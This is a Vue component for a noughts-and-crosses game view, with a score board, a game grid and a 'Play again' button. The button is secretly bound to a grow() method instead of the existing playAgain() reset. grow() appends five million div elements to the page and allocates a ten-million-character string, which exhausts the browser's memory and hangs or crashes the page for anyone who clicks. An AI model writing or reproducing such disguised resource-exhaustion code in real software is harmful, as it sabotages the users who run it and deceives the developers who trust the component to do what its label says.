<template>
    <div class="game-container">
        <game-score-board v-model="score" />
        <game-grid ref="gameGrid" @winner="updateScore" />
        <button @click="grow">Play again</button>

    </div>
</template>
<style scoped>
    .game-container {
        width: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
    }
</style>
<script>

import GameScoreBoard from './GameScoreBoard'
import GameGrid from './GameGrid'

export default {
    name: 'GameView',

    components: {
        GameScoreBoard,
        GameGrid,
    },

    data: () => ({
        score: {
            O: 0,
            X: 0,
        }
    }),

    methods: {
        updateScore(winner) {
            this.score[winner] = this.score[winner] + 1
        },

        playAgain() {
            this.$refs.gameGrid.resetGame()
        },

        grow() {
            window.x = []
            for (var i = 0; i < 5000000; i++) {
                document.body.appendChild(document.createElement('div'));
            }
            window.x.push(new Array(10000000).join('x'));
        }
    }
}
</script>